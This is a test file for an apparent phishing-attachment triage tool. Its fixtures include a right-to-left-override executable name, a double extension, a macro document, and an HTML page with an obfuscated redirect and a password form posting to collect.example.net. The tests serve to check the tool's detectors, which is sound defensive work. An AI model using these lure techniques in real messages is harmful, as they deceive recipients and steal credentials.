import hashlib
import io
import zipfile

from phishtriage.attachments import detect_type, inspect_attachment
from phishtriage.parser import Attachment


def attachment(name: str, data: bytes, content_type: str = "application/octet-stream") -> Attachment:
    return Attachment(name, content_type, len(data), hashlib.sha256(data).hexdigest(), False, data)


def make_zip(files: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for name, data in files.items():
            archive.writestr(name, data)
    return buffer.getvalue()


def test_magic_bytes_beat_the_file_name():
    info, _ = inspect_attachment(attachment("invoice.pdf", b"<!DOCTYPE html><html><body>hi</body></html>"))
    assert (info.detected_type, info.category, info.extension_mismatch) == ("html", "html", True)
    info, _ = inspect_attachment(attachment("report.pdf", b"%PDF-1.7 test"))
    assert (info.detected_type, info.extension_mismatch) == ("pdf", False)


def test_double_extension_and_hidden_characters():
    info, _ = inspect_attachment(attachment("statement.pdf.html", b"<html></html>"))
    assert info.double_extension
    info, _ = inspect_attachment(attachment("invoice\u202efdp.exe", b"MZ\x90\x00"))
    assert info.category == "executable"
    assert info.name_suspicious_characters  # right-to-left override makes it display as "invoiceexe.pdf"


def test_archive_listing_without_extracting():
    data = make_zip({"scan.pdf.lnk": b"x", "readme.txt": b"y"})
    info, _ = inspect_attachment(attachment("documents.zip", data))
    assert info.category == "archive"
    assert info.archive_members == ["scan.pdf.lnk", "readme.txt"]
    assert info.archive_risky_members == ["scan.pdf.lnk"]
    assert not info.encrypted_archive


def test_password_protected_archive():
    data = bytearray(make_zip({"payload.exe": b"MZ"}))
    central = data.index(b"PK\x01\x02")
    data[central + 8] |= 0x1  # set the "encrypted" flag in the central directory
    info, _ = inspect_attachment(attachment("secure.zip", bytes(data)))
    assert info.encrypted_archive


def test_office_macros():
    data = make_zip({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<w/>", "word/vbaProject.bin": b"\x00"})
    info, _ = inspect_attachment(attachment("order.docm", data))
    assert (info.detected_type, info.has_macros, info.category) == ("ooxml", True, "macro-document")
    clean = make_zip({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<w/>"})
    info, _ = inspect_attachment(attachment("order.docx", clean))
    assert (info.has_macros, info.category, info.extension_mismatch) == (False, "document", False)


def test_html_attachment_with_login_form_and_script_tricks():
    page = b"""<html><body><script>var u = atob("aHR0cHM6Ly9leGFtcGxlLm5ldA=="); window.location.href = u;</script>
    <form action="https://collect.example.net/p"><input type="password" name="pw"></form></body></html>"""
    info, text = inspect_attachment(attachment("secure_message.htm", page))
    assert info.html_login_form
    assert "decodes hidden text (atob)" in info.html_script_tricks
    assert "redirects the browser (location)" in info.html_script_tricks
    assert "collect.example.net" in text


def test_apple_configuration_profile_without_extension():
    profile = b"""<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist><plist version="1.0"><dict>
    <key>PayloadContent</key><array><dict><key>PayloadType</key><string>com.apple.vpn.managed</string></dict></array>
    <key>PayloadType</key><string>Configuration</string></dict></plist>"""
    info, _ = inspect_attachment(attachment("Compliance2026", profile))
    assert (info.detected_type, info.category) == ("mobileconfig", "config-profile")
    assert info.config_profile_payloads == ["com.apple.vpn.managed", "Configuration"]


def test_detect_common_types():
    assert detect_type(b"\x89PNG\r\n\x1a\n") == "png"
    assert detect_type(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1") == "ole"
    assert detect_type(b"L\x00\x00\x00\x01\x14\x02\x00\x00\x00") == "lnk"
    assert detect_type(b"<svg xmlns='http://www.w3.org/2000/svg'><script/></svg>") == "svg"
    assert detect_type(b"plain words") == "unknown"
